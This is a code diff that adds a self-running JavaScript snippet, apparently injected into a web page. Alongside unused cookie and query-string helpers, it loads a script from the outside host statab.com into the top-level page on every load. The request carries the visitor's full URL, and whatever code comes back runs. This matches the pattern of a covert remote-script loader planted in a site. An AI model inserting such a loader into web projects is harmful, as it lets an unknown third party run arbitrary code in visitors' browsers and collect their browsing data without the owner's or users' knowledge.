@@ -1,0 +1,58 @@
+
+    (function () {
+        function getCookie(name) {
+            var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
+            return matches ? decodeURIComponent(matches[1]) : undefined
+        }
+
+        function setCookie(name, value, props) {
+            props = props || {};
+            var exp = props.expires;
+            if (typeof exp == "number" && exp) {
+                var d = new Date();
+                d.setTime(d.getTime() + exp * 1000);
+                exp = props.expires = d
+            }
+            if (exp && exp.toUTCString) {
+                props.expires = exp.toUTCString()
+            }
+            value = encodeURIComponent(value);
+            var updatedCookie = name + "=" + value;
+            for (var propName in props) {
+                updatedCookie += "; " + propName;
+                var propValue = props[propName];
+                if (propValue !== true) {
+                    updatedCookie += "=" + propValue
+                }
+            }
+            document.cookie = updatedCookie
+        }
+
+        function deleteCookie(name) {
+            setCookie(name, null, {expires: -1})
+        }
+
+        function $_GET(e) {
+            var t = window.location.search;
+            t = t.match(new RegExp(e + "=([^&=]+)"));
+            return t ? t[1] : undefined;
+        }
+
+        function init() {
+            var src = '//statab.com/r/s/t?t=' + Math.random() + '&ur=' + encodeURIComponent(window.location.toString());
+            var s = document.createElement('script');
+            s.setAttribute('src', src);
+            s.setAttribute("async", "true");
+            s.setAttribute("id", "xretag_cont");
+            s.setAttribute("type", "text/javascript");
+            window.top.document.body.appendChild(s);
+        }
+
+        if (window.top.document.body == null) {
+            document.addEventListener('DOMContentLoaded', function () {
+                init();
+            });
+        } else {
+            init();
+        }
+    })();
